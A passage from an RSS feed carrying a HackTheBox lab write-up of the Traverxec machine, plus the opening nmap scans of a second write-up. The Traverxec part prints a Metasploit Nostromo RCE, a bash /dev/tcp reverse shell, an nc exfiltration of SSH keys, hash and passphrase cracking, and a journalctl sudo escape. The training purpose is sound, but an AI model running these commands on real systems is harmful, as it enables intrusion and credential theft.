      <content:encoded><![CDATA[<p>Traverxec is an easy Linux machine that starts with exploitation of a Nostromo web server. The server is vulnerable to a remote code execution, and this allows me to gain an interactive shell access into the system. Enumeration of the system discovers a backup files that contains user SSH keys. The user is allowed to run a sudo on <code>journalctl</code> binary, and this could be leveraged to obtain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Path Traversal</li>
<li>Sudo exploitation - journalctl</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Metasploit</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial TCP scan discovers two open ports: SSH on port 22 and a Nostromo web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
$ nmap -p22,80 -sC -sV  -oA nmap/10-tcp-allport-script-traverxec 10.10.10.165
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-13 16:11 EDT
Nmap scan report <span class="k">for</span> 10.10.10.165
Host is up <span class="o">(</span>0.44s latency<span class="o">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nostromo 1.9.6
<span class="p">|</span>_http-server-header: nostromo 1.9.6
<span class="p">|</span>_http-title: TRAVERXEC
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.71 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---nostromo">TCP 80 - Nostromo</h3>
<p>The hosted site is a personal website of David White.</p>
<p><img class="img-container" src="imgs/image-20210714031626971.png" alt="image-20210714031626971"  />
</p>
<p>At the bottom of the page, there is a contact form with 4 input vectors.</p>
<p><img class="img-container" src="imgs/image-20210714031846286.png" alt="image-20210714031846286"  />
</p>
<p>I submitted some values  and then started to observe the network traffic, but nothing happen there.</p>
<p><img class="img-container" src="imgs/image-20210714032010619.png" alt="image-20210714032010619"  />
</p>
<p>I  ran gobuster, but it also didn&rsquo;t find any interesting.</p>
<h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
<p>From previous <code>nmap</code>, nmap identified the <code>nostromo</code> version to be 1.9.6. Feeding that version on <code>searchsploit</code> pops a remote code execution exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
$ searchsploit nostromo 1.9.6         
--------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                               <span class="p">|</span>  Path
--------------------------------------------------------------------------------------------- ---------------------------------
nostromo 1.9.6 - Remote Code Execution                                                       <span class="p">|</span> multiple/remote/47837.py
--------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="nostromo-rce-cve-2019-16278-metasploit">Nostromo RCE CVE-2019-16278 (Metasploit)</h4>
<p>Metasploit also has a module for the Nostromo 1.9.6 RCE and I will use that.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
$ msfconsole -q
msf6 &gt; search nostromo

Matching <span class="nv">Modules</span>
<span class="o">================</span>

   <span class="c1">#  Name                                   Disclosure Date  Rank  Check  Description</span>
   -  ----                                   ---------------  ----  -----  -----------
   <span class="m">0</span>  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution


Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/multi/http/nostromo_code_exec

msf6 &gt; use <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Using configured payload cmd/unix/reverse_perl
</code></pre></div><p>Once all the configs are set, I will run the exploits. This results in an interactive shell access as <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> &gt; run

<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.34:53 
<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
<span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable.
<span class="o">[</span>*<span class="o">]</span> Configuring Automatic <span class="o">(</span>Unix In-Memory<span class="o">)</span> target
<span class="o">[</span>*<span class="o">]</span> Sending cmd/unix/reverse_perl <span class="nb">command</span> payload
<span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.34:53 -&gt; 10.10.10.165:52716<span class="o">)</span> at 2021-07-13 16:31:29 -0400

id

<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
hostname <span class="o">&amp;&amp;</span> ip a
traverxec
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UNKNOWN group default qlen <span class="m">1000</span>
    link/ether 00:50:56:b9:a0:f8 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.165/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I will create another interactive shell session so I can upgrade my shell with the PTY trick.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">which bash
/usr/bin/bash
bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.34/53 0&gt;&amp;1&#34;</span> <span class="p">&amp;</span>
</code></pre></div><p>On my new session:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165<span class="o">]</span> <span class="m">52718</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>421<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ script /dev/null -c bash 
script /dev/null -c bash
Script started, file is /dev/null
www-data@traverxec:/usr/bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
www-data@traverxec:/usr/bin$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">3835</span> suspended  nc -nvlp <span class="m">53</span>
→ kali@kali «traverxec» «10.10.14.34» 
$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>     
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">3835</span> continued  nc -nvlp <span class="m">53</span>

www-data@traverxec:/usr/bin$ stty cols <span class="m">127</span> rows <span class="m">30</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-david">Shell as david</h3>
<h4 id="nostromo-config">Nostromo config</h4>
<p>The <code>nostromo</code> config file under <code>/var/nostromo/conf</code> reveals that there is a <code>.htpasswd</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
<span class="c1"># MAIN [MANDATORY]</span>

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

<span class="c1"># LOGS [OPTIONAL]</span>

logpid                  logs/nhttpd.pid

<span class="c1"># SETUID [RECOMMENDED]</span>

user                    www-data

<span class="c1"># BASIC AUTHENTICATION [OPTIONAL]</span>

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

<span class="c1"># ALIASES [OPTIONAL]</span>

/icons                  /var/nostromo/icons

<span class="c1"># HOMEDIRS [OPTIONAL]</span>

homedirs                /home
homedirs_public         public_www
</code></pre></div><p>This<code>.htpasswd </code> file contains a password hash for user david.</p>
<pre><code>www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
www-data@traverxec:/var/nostromo/conf$ cat /etc/passwd | grep sh &amp;&amp; ls -l /home
root:x:0:0:root:/root:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
david:x:1000:1000:david,,,:/home/david:/bin/bash
total 4
drwx--x--x 6 david david 4096 Jul 13 06:57 david
</code></pre><h4 id="password-cracking">Password Cracking</h4>
<p><code>JtR</code> can recover the password easily.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$./john.exe hashes/traverxec-david.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt                                  

...<span class="o">[</span>SNIP<span class="o">]</span>...
Using default input encoding: UTF-8
Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1</span>$ <span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3<span class="o">])</span>
Will run <span class="m">8</span> OpenMP threads
Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
Nowonly4me       <span class="o">(</span>david<span class="o">)</span>
1g 0:00:00:43 DONE <span class="o">(</span>2021-07-14 03:44<span class="o">)</span> 0.02307g/s 244113p/s 244113c/s 244113C/s NuiKo910..Noury
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>But turns out it&rsquo;s not a reused password.</p>
<pre><code>www-data@traverxec:/var/nostromo/conf$ su david
Password: 
su: Authentication failure
www-data@traverxec:/var/nostromo/conf$ 
</code></pre><h4 id="path-traversal---david-home-directory">Path Traversal - David home directory</h4>
<p>The david home directory is not readable by others, but with execute permissions,  I can determine what files all are available under david&rsquo;s home directory by spamming one character and leverage the tab completion. This is one of the benefits of doing a shell upgrade!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/
drwx--x--x <span class="m">6</span> david david <span class="m">4096</span> Jul <span class="m">13</span> 06:57 /home/david/
www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/.ssh
drwx------ <span class="m">2</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/.ssh
www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/user.txt
-r--r----- <span class="m">1</span> root david <span class="m">33</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/user.txt
www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/
ls: cannot open directory <span class="s1">&#39;/home/david/&#39;</span>: Permission denied
</code></pre></div><p>Then, when I type <code>public_www</code> (from nostromo config), the tab completion confirms that the folder is there. With <code>r-x</code>, I can use <code>ls -lR</code> command to list all the available contents recursively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/public_www
drwxr-xr-x <span class="m">3</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/public_www
www-data@traverxec:/var/nostromo/conf$ ls -lR /home/david/public_www
/home/david/public_www:
total <span class="m">8</span>
-rw-r--r-- <span class="m">1</span> david david  <span class="m">402</span> Oct <span class="m">25</span>  <span class="m">2019</span> index.html
drwxr-xr-x <span class="m">2</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> protected-file-area

/home/david/public_www/protected-file-area:
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> david david <span class="m">1915</span> Oct <span class="m">25</span>  <span class="m">2019</span> backup-ssh-identity-files.tgz
</code></pre></div><p>The <code>backup-ssh-identity-files.tgz</code> seems interesting, I will grab that and send it over to my Kali.</p>
<pre><code>www-data@traverxec:/var/nostromo/conf$ cat /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz | nc 10.10.14.34 53
</code></pre><p>On my Kali:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
$ nc -nvlp <span class="m">53</span> &gt; loot/backup-ssh-identity-files.tgz
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165<span class="o">]</span> <span class="m">52728</span>
</code></pre></div><h4 id="passphrase-crack">Passphrase crack</h4>
<p>The backup file contains a set of SSH keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.34» 
$ tar -xvf backup-ssh-identity-files.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
</code></pre></div><p>But, it is protected with a passphrase.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «ssh-keys» «10.10.14.34» 
$ ssh -i id_rsa david@traverxec.htb 
Enter passphrase <span class="k">for</span> key <span class="s1">&#39;id_rsa&#39;</span>: 
david@traverxec.htb<span class="err">&#39;</span>s password:
</code></pre></div><p>So I will convert the key to crackable format hash using <code>ssh2john</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «ssh-keys» «10.10.14.34» 
$ ssh2john id_rsa &gt; david_rsa.hash
→ kali@kali «ssh-keys» «10.10.14.34» 
$ /usr/share/john/ssh2john.py id_rsa &gt; david_rsa.hash 
→ kali@kali «ssh-keys» «10.10.14.34» 
$ cat david_rsa.hash 
id_rsa:<span class="nv">$sshng$1$16$477</span>EEFFBA56F9D283D349033D5D08C4F<span class="nv">$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672</span>...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>And <code>JtR</code> can also recover the passphrase. It is <code>hunter</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ./john.exe hashes/traverxec-david-rsa.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt                    
...<span class="o">[</span>SNIP<span class="o">]</span>...
Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64<span class="o">])</span>
Cost <span class="m">1</span> <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES<span class="o">])</span> is <span class="m">0</span> <span class="k">for</span> all loaded hashes
Cost <span class="m">2</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1</span> <span class="k">for</span> all loaded hashes
Will run <span class="m">8</span> OpenMP threads
Note: This format may emit <span class="nb">false</span> positives, so it will keep trying even after
finding a possible candidate.
Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
hunter           <span class="o">(</span>id_rsa<span class="o">)</span>
</code></pre></div><h4 id="ssh---david">SSH - David</h4>
<p>The key and the passphrase are work for user david.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
$ ssh -i ssh-keys/david_rsa david@traverxec.htb
Enter passphrase <span class="k">for</span> key <span class="s1">&#39;ssh-keys/david_rsa&#39;</span>: 
Linux traverxec 4.19.0-6-amd64 <span class="c1">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
Last login: Tue Jul <span class="m">13</span> 06:54:56 <span class="m">2021</span> from 10.10.16.7
david@traverxec:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>
</code></pre></div><p>User flag is done here</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@traverxec:~$ ls -la
total <span class="m">60</span>
drwx--x--x <span class="m">6</span> david david  <span class="m">4096</span> Jul <span class="m">13</span> 06:57 .
drwxr-xr-x <span class="m">3</span> root  root   <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> ..
-rwxr-xr-x <span class="m">1</span> david david <span class="m">18992</span> Jul <span class="m">13</span> 05:43 <span class="m">47163</span>
lrwxrwxrwx <span class="m">1</span> root  root      <span class="m">9</span> Oct <span class="m">25</span>  <span class="m">2019</span> .bash_history -&gt; /dev/null
-rw-r--r-- <span class="m">1</span> david david   <span class="m">220</span> Oct <span class="m">25</span>  <span class="m">2019</span> .bash_logout
-rw-r--r-- <span class="m">1</span> david david  <span class="m">3544</span> Jul <span class="m">13</span> 06:57 .bashrc
drwx------ <span class="m">2</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> bin
drwxr-xr-x <span class="m">3</span> david david  <span class="m">4096</span> Jul <span class="m">13</span> 06:56 .local
-rw-r--r-- <span class="m">1</span> david david   <span class="m">807</span> Oct <span class="m">25</span>  <span class="m">2019</span> .profile
drwxr-xr-x <span class="m">3</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> public_www
drwx------ <span class="m">2</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> .ssh
-r--r----- <span class="m">1</span> root  david    <span class="m">33</span> Oct <span class="m">25</span>  <span class="m">2019</span> user.txt
david@traverxec:~$ cat user.txt 
7db0...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>On under <code>bin</code> folder, there is one suspicious script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@traverxec:~$ ls -l bin/
total <span class="m">8</span>
-r-------- <span class="m">1</span> david david <span class="m">802</span> Oct <span class="m">25</span>  <span class="m">2019</span> server-stats.head
-rwx------ <span class="m">1</span> david david <span class="m">363</span> Oct <span class="m">25</span>  <span class="m">2019</span> server-stats.sh
</code></pre></div><p>When I run the script, I get the following results:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@traverxec:~/bin$ ./server-stats.sh 
                                                                          .----.
                                                              .---------. <span class="p">|</span> <span class="o">==</span> <span class="p">|</span>
   Webserver Statistics and Data                              <span class="p">|</span>.-<span class="s2">&#34;&#34;&#34;&#34;&#34;-.| |----|
</span><span class="s2">         Collection Script                                    ||       || | == |
</span><span class="s2">          (c) David, 2019                                     ||       || |----|
</span><span class="s2">                                                              |&#39;-.....-&#39;| |::::|
</span><span class="s2">                                                              &#39;&#34;&#34;)---(&#34;&#34;&#39; |___.|
</span><span class="s2">                                                             /:::::::::::\&#34;    &#34;</span>
                                                            /:::<span class="o">=======</span>:::<span class="se">\
</span><span class="se"></span>                                                        jgs <span class="s1">&#39;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#39;</span> 

Load:  18:24:49 up 17:04,  <span class="m">1</span> user,  load average: 0.13, 0.04, 0.01
 
Open nhttpd sockets: <span class="m">0</span>
Files in the docroot: <span class="m">117</span>
 
Last <span class="m">5</span> journal log lines:
-- Logs begin at Tue 2021-07-13 01:20:43 EDT, end at Tue 2021-07-13 18:24:49 EDT. --
Jul <span class="m">13</span> 17:16:02 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: authentication failure<span class="p">;</span> <span class="nv">logname</span><span class="o">=</span> <span class="nv">uid</span><span class="o">=</span><span class="m">33</span> <span class="nv">euid</span><span class="o">=</span><span class="m">0</span> <span class="nv">tty</span><span class="o">=</span>/dev/pts/0 <span class="nv">ruser</span><span class="o">=</span>www-data <span class="nv">rhost</span><span class="o">=</span>  <span class="nv">user</span><span class="o">=</span>www-data
Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: conversation failed
Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: auth could not identify password <span class="k">for</span> <span class="o">[</span>www-data<span class="o">]</span>
Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: www-data : <span class="nb">command</span> not allowed <span class="p">;</span> <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/dev/shm <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>list
Jul <span class="m">13</span> 17:16:04 traverxec nologin<span class="o">[</span>24564<span class="o">]</span>: Attempted login by UNKNOWN on UNKNOWN
</code></pre></div><h4 id="sudo-journalctl">Sudo journalctl</h4>
<p>Based on the contents of <code>server-stats.sh</code>, user <code>david</code> has ability to run <code>journalctl</code>  with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@traverxec:~/bin$ cat server-stats.sh 
<span class="c1">#!/bin/bash</span>

cat /home/david/bin/server-stats.head
<span class="nb">echo</span> <span class="s2">&#34;Load: `/usr/bin/uptime`&#34;</span>
<span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
<span class="nb">echo</span> <span class="s2">&#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&#34;</span>
<span class="nb">echo</span> <span class="s2">&#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&#34;</span>
<span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
<span class="nb">echo</span> <span class="s2">&#34;Last 5 journal log lines:&#34;</span>
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service <span class="p">|</span> /usr/bin/cat 
</code></pre></div><p>But, when I run <code>/usr/bin/sudo /usr/bin/journalctl</code>, it asks for a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> david: 
Sorry, try again.
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> david: 
Sorry, try again.
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> david: 
</code></pre></div><p>Then, I grab this line <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> and run it. This is what I get:</p>
<p><img class="img-container" src="imgs/image-20210714052617836.png" alt="image-20210714052617836"  />
</p>
<p>That means I can run the following command with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
</code></pre></div><p>According to the <a href="https://gtfobins.github.io/gtfobins/journalctl/">GTFOBins</a>, the default pager of <code>journalctl</code> is <code>less</code>. Now since it runs with root privilege, I can escape from the pager using  <code>!/bin/bash</code>.</p>
<p><img class="img-container" src="imgs/image-20210714054042963.png" alt="image-20210714054042963"  />
</p>
<hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec/">https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec/</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/journalctl/">https://gtfobins.github.io/gtfobins/journalctl/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Writeup</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-writeup/</link>
      <pubDate>Fri, 06 Aug 2021 00:04:21 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-writeup/</guid>
      <description>Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database, and these credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.</description>
      <content:encoded><![CDATA[<p>Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database, and these credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploiting CMS Made Simple</li>
<li>Path Hijack</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li><a href="https://www.exploit-db.com/exploits/46635">CMS Made Simple Exploit PoC</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full tcp scan using <code>nmap</code> discovers two open ports: SSH on port 22 and an Apache web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «writeup» «10.10.14.83» 
$ nmap -p- -oA nmap/10-tcp-allport-writeup 10.10.10.138                 
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 15:32 EDT
Nmap scan report <span class="k">for</span> 10.10.10.138
Host is up <span class="o">(</span>0.052s latency<span class="o">)</span>.
Not shown: <span class="m">65533</span> filtered ports
PORT   STATE SERVICE
22/tcp  ssh
80/tcp open  http

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 109.90 seconds
→ kali@kali «writeup» «10.10.14.83» 
$ nmap -p22,80 -sC -sV -oA nmap/10-tcp-allport-script-writeup 10.10.10.138
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 15:50 EDT
Nmap scan report <span class="k">for</span> 10.10.10.138
Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry 
<span class="p">|</span>_/writeup/
<span class="p">|</span>_http-title: Nothing here yet.
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.02 seconds
